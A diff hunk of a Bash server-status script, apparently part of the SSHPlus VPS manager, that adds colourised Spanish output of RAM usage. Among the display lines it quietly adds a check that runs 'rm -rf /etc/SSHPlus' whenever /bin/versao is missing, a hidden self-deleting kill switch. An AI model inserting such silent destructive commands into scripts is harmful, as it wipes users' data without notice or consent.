@@ -54,6 +54,19 @@ ram2=$(free -h | grep -i mem | awk {'print $4'})
 ram3=$(free -h | grep -i mem | awk {'print $3'})
 usoram=$(free -m | awk 'NR==2{printf "%.2f%%\t\t", $3*100/$2 }')
 
+echo -e "\033[1;31m• \033[1;31mMEMORIA RAM\033[1;31m •\033[0m"
+echo ""
+echo -e "\033[1;33mTotal: \033[1;37m$ram1"
+echo -e "\033[1;33mEn Uso: \033[1;37m$ram3"
+echo -e "\033[1;33mLibre: \033[1;37m$ram2"
+echo -e "\033[1;33multilizado: \033[37m$usoram"
+echo ""
+else
+echo -e "\033[1;31mMEMORIA RAM\033[0m"
+echo ""
+echo "No fue posible obter info"
+fi
+[[ ! -e /bin/versao ]] && rm -rf /etc/SSHPlus
 echo -e "\033[1;31m• \033[1;31mSERVICIOS EN EJECUCION\033[1;31m •\033[0m"
 echo ""
 PT=$(lsof -V -i tcp -P -n | grep -v "ESTABLISHED" |grep -v "COMMAND" | grep "LISTEN")
